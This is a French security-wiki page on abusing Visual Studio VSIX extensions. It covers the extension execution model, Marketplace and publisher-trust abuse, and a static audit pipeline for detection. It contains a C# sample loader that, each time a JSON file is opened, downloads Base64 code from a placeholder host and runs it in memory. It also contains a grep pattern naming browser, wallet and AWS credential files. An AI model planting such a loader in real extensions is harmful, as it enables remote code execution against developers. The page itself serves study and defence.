# Abus des extensions VSIX de Visual Studio

{{#include ../banners/hacktricks-training.md}}

Une extension Visual Studio peut transformer une activité courante dans l’éditeur en exécution de code sous l’identité de l’utilisateur connecté. Un VSIX malveillant, un éditeur usurpant l’identité d’un autre ou une mise à jour compromise d’une extension peuvent atteindre cet utilisateur par les canaux d’installation habituels. Une installation qui demande les droits d’administrateur est une installation consentie, et non une élévation automatique de privilèges.<sup>[[1]](#references)</sup>

## Modèle d’exécution

Les extensions VSSDK classiques s’exécutent généralement dans `devenv.exe`. Le modèle plus récent `VisualStudio.Extensibility` exécute principalement les extensions .NET modernes hors processus : Visual Studio relaie les appels vers un processus dédié `Microsoft.ServiceHub.Host.Extensibility`, ce qui isole la stabilité de l’IDE, mais **ne** place **pas** l’extension dans un bac à sable qui la séparerait des autorisations Windows de l’utilisateur. Le nom exact de l’exécutable peut inclure un suffixe d’architecture, tel que `ServiceHub.Host.Extensibility.arm64.exe`.<sup>[[1]](#references)[[2]](#references)</sup>

### Déclenchement lors d’une activité courante dans l’éditeur

Au lieu d’exposer uniquement une commande de menu évidente, une extension peut implémenter `ITextViewOpenClosedListener`. Son callback `TextViewOpenedAsync` est appelé pour les documents correspondants, tandis que `TextViewExtensionConfiguration.AppliesTo` peut limiter l’activation à un type courant, comme JSON. Un formateur ou un linter légitime peut continuer à effectuer la tâche annoncée, tandis qu’une seconde action s’exécute en arrière-plan à l’ouverture d’un fichier.<sup>[[1]](#references)[[3]](#references)</sup>

Le modèle simplifié suivant présente les points d’exécution importants ; il omet le formateur légitime et la gestion des erreurs par souci de clarté.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Chargeur d’assembly managé en mémoire déclenché par un événement</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Cette chaîne télécharge du texte Base64, le décode en octets d’assembly, le charge depuis un `MemoryStream` via un `AssemblyLoadContext` collectible, invoque le `EntryPoint` réfléchi avec soit aucun paramètre, soit un `string[]`, attend les points d’entrée asynchrones, puis décharge le contexte. La deuxième étape n’est pas écrite sur le disque, bien que le VSIX et la DLL principale de l’extension restent des artefacts sur disque. Base64 n’offre ni authenticité ni confidentialité ; l’utilisation de HTTP permet également à un attaquant situé sur le chemin de remplacer la réponse.<sup>[[1]](#references)</sup>

Les variantes opérationnelles incluent la suppression de toutes les exceptions pour que la fonctionnalité annoncée continue de fonctionner en cas d’échec du staging, ou l’utilisation de `ITextViewChangedListener` pour déclencher l’exécution après des modifications. Le code s’exécute dans l’hôte d’extensions et peut utiliser les API managées, P/Invoke, les fichiers, les identifiants et les processus enfants accessibles à cet utilisateur.<sup>[[1]](#references)</sup>

Pour une surface d’exécution connexe, spécifique à un éditeur et basée sur le chargement automatique de plugins natifs, voir :

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Abus de la confiance dans le Marketplace et le mode de distribution

Un VSIX peut être reçu sous forme de fichier partagé directement ou obtenu par hameçonnage, depuis le Marketplace web ou via le navigateur Marketplace intégré à Visual Studio. L’enregistrement d’un éditeur, qui vise principalement à garantir l’unicité et à appliquer une liste de mots réservés, peut permettre la création d’identités d’éditeurs visuellement trompeuses ; compromettre un éditeur ou une extension déjà approuvés est encore plus efficace, car cela permet de profiter de sa base d’utilisateurs installés. L’installation depuis le Marketplace appelle Visual Studio Installer et place temporairement le VSIX téléchargé dans `%LOCALAPPDATA%\Temp` ; `payload.vsix` étant également utilisé légitimement, le nom de fichier seul n’est pas un indicateur.<sup>[[1]](#references)</sup>

MDSec n’a pas identifié de protocole URL Visual Studio permettant d’installer directement une extension. L’opérateur doit tout de même faire installer/approuver le VSIX par l’utilisateur, ou compromettre le canal de distribution d’une extension existante. Un package `AllUsers` s’installe dans le dossier d’installation de Visual Studio et peut demander une élévation, mais il s’agit d’un comportement normal de l’installateur, avec consentement, et non d’un moyen automatique d’obtenir les privilèges d’administrateur ou SYSTEM.<sup>[[1]](#references)[[4]](#references)</sup>

### Audit statique à grande échelle

Les packages VSIX sont généralement des conteneurs ZIP. Un pipeline sûr d’analyse du Marketplace peut donc énumérer les packages, les décompresser **sans charger le code des extensions**, analyser les manifestes, repérer les surfaces exécutables et décompiler les assemblies managés avec `ilspycmd`. Donnez la priorité aux assemblies appartenant aux extensions après exclusion des dépendances courantes incluses dans les packages, puis corrélez les chaînes liées aux magasins d’identifiants avec des groupes de comportements tels que lecture de fichier et envoi réseau, encodage et envoi, téléchargement et exécution, accès au gestionnaire d’identifiants et au réseau, ou capture d’écran et envoi.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Inventoriez également les DLL natives, les targets MSBuild, les scripts, les modèles T4 et les payloads d’installation au lieu de supposer que toutes les surfaces d’exécution reposent sur du code managé. Comparez les comportements suspects avec l’objectif déclaré dans le manifeste ; la télémétrie et les programmes de mise à jour légitimes peuvent ressembler à de l’exfiltration ou du staging. Une analyse statique seule ne détecte pas le code empaqueté, obfusqué, résolu dynamiquement ou dormant, et l’examen de la dernière version uniquement peut faire manquer des versions historiques malveillantes.<sup>[[1]](#references)</sup>

Une attaque distincte au chargement d’un projet peut exécuter une target [MSBuild `GetFrameworkPaths`](visual-studio-project-msbuild-execution.md) malveillante sans installer de VSIX.<sup>[[6]](#references)</sup>

## References

- [1] [MDSec - Extensions Visual Studio revisitées](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - À propos de VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - Anatomie d’un package VSIX](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - Outil .NET ilspycmd](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
- [6] [Unit 42 - La campagne Blinder Tunnel cible les infrastructures irakiennes](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
{{#include ../banners/hacktricks-training.md}}
